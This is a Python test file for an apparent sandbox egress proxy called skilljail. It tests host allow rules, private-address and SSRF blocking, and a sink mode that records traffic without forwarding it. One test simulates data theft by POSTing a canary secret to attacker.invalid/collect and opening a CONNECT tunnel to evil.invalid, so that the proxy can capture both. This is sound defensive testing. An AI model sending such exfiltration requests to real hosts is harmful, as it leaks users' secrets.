import http.client
import socket
import threading
from http.server import BaseHTTPRequestHandler, HTTPServer

import pytest

from skilljail.proxy import EgressProxy, NetPolicy, NetRule, is_private_address


def test_rule_matching():
    assert NetRule.parse("example.com").matches("example.com", 443)
    assert NetRule.parse("example.com").matches("EXAMPLE.com.", 80)
    assert not NetRule.parse("example.com").matches("example.com", 8080)
    assert NetRule.parse("example.com:*").matches("example.com", 8080)
    assert NetRule.parse("*.example.com").matches("api.example.com", 443)
    assert not NetRule.parse("*.example.com").matches("example.com", 443)  # apex excluded
    assert not NetRule.parse("*.example.com").matches("evilexample.com", 443)
    assert not NetRule.parse("*.example.com").matches("example.com.evil.com", 443)  # suffix-position spoof
    assert NetRule.parse("*.example.com").matches("a.b.example.com", 443)  # deep subdomains allowed
    assert NetRule.parse("*").matches("anything.tld", 443)
    assert NetRule.parse("10.0.0.5:53").matches("10.0.0.5", 53)


def test_private_ranges():
    for a in ["127.0.0.1", "10.1.2.3", "192.168.1.1", "172.16.5.5", "169.254.169.254", "100.64.0.1", "::1", "::", "fd00::1", "0.0.0.0"]:
        assert is_private_address(a), a
    for a in ["93.184.216.34", "1.1.1.1", "2606:4700::1111"]:
        assert not is_private_address(a), a


class _Echo(BaseHTTPRequestHandler):
    def do_GET(self):
        body = f"path={self.path} host={self.headers.get('Host')}".encode()
        self.send_response(200)
        self.send_header("Content-Length", str(len(body)))
        self.end_headers()
        self.wfile.write(body)

    def log_message(self, *a):
        pass


@pytest.fixture
def upstream():
    srv = HTTPServer(("127.0.0.1", 0), _Echo)
    t = threading.Thread(target=srv.serve_forever, daemon=True)
    t.start()
    yield srv.server_address[1]
    srv.shutdown()


def _via_proxy(proxy_port: int, method: str, url: str, host_hdr: str | None = None):
    c = http.client.HTTPConnection("127.0.0.1", proxy_port, timeout=5)
    c.putrequest(method, url, skip_host=True, skip_accept_encoding=True)
    if host_hdr:
        c.putheader("Host", host_hdr)
    c.endheaders()
    r = c.getresponse()
    body = r.read()
    return r.status, dict(r.getheaders()), body


def test_proxy_denies_unlisted_and_private(upstream):
    events = []
    with EgressProxy(NetPolicy.from_rules(["example.com"]), on_event=events.append) as p:
        status, headers, _ = _via_proxy(p.port, "GET", "http://notallowed.test/x", "notallowed.test")
        assert status == 403 and "X-SkillJail-Blocked" in headers
        # allowed by name but resolves to loopback → SSRF guard
        status2, headers2, _ = _via_proxy(p.port, "GET", f"http://localhost:{upstream}/x", f"localhost:{upstream}")
        assert status2 == 403
    assert [e.decision for e in events] == ["deny", "deny"]
    assert "private" in events[1].reason or "no net.allow" in events[1].reason


def test_proxy_forwards_when_allowed(upstream):
    events = []
    pol = NetPolicy.from_rules([f"localhost:{upstream}"], allow_private=True)
    with EgressProxy(pol, on_event=events.append) as p:
        status, _, body = _via_proxy(p.port, "GET", f"http://localhost:{upstream}/hello", f"localhost:{upstream}")
        assert status == 200 and b"path=/hello" in body
    assert events[0].decision == "allow" and events[0].bytes_down > 0


def test_proxy_sink_mode_records_without_dialing():
    events = []
    with EgressProxy(NetPolicy.from_rules([]), mode="sink", on_event=events.append) as p:
        c = http.client.HTTPConnection("127.0.0.1", p.port, timeout=5)
        c.putrequest("POST", "http://attacker.invalid/collect", skip_host=True, skip_accept_encoding=True)
        c.putheader("Host", "attacker.invalid")
        payload = b"AKIA-canary-secret"
        c.putheader("Content-Length", str(len(payload)))
        c.endheaders()
        c.send(payload)
        r = c.getresponse()
        assert r.status == 200 and r.getheader("X-SkillJail-Sink") == "1"
        # CONNECT is acknowledged and first bytes captured
        s = socket.create_connection(("127.0.0.1", p.port), timeout=5)
        s.sendall(b"CONNECT evil.invalid:443 HTTP/1.1\r\nHost: evil.invalid:443\r\n\r\n")
        resp = s.recv(1024)
        assert b"200" in resp
        s.sendall(b"\x16\x03\x01fakehello")
        s.close()
    kinds = {(e.method, e.decision) for e in events}
    assert ("POST", "sink") in kinds and ("CONNECT", "sink") in kinds
    post = next(e for e in events if e.method == "POST")
    assert "canary" in (post.preview or "")
    con = next(e for e in events if e.method == "CONNECT")
    assert con.preview and con.preview.startswith("<tls-client-hello")
